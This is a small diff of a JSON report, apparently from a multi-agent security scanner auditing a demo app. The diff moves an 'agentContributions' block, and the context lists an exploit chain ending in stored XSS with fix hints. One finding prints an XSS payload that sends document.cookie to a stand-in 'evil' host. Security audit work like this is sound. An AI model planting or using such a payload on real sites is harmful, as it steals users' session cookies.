@@ -13,12 +13,6 @@
     "Walk the top exploit chain: secrets → admin token → open admin API → IDOR → SQLi → stored XSS.",
     "Generate fix PLAN, copy for Cursor, and paste into the demo-app workspace to remediate in one session."
   ],
-  "agentContributions": {
-    "secrets-scout": 2,
-    "auth-guard": 2,
-    "injection-hunter": 2,
-    "orchestrator": 6
-  },
   "findings": [
     {
       "id": "VG-001",
@@ -86,5 +80,11 @@
       "exploitScenario": "Save a note containing <img src=x onerror=fetch('https://evil/?c='+document.cookie)>; victims viewing the note execute attacker script.",
       "fixHint": "Sanitize HTML with a vetted library, or render plain text only; avoid dangerouslySetInnerHTML for user content."
     }
-  ]
+  ],
+  "agentContributions": {
+    "secrets-scout": 2,
+    "auth-guard": 2,
+    "injection-hunter": 2,
+    "orchestrator": 6
+  }
 }
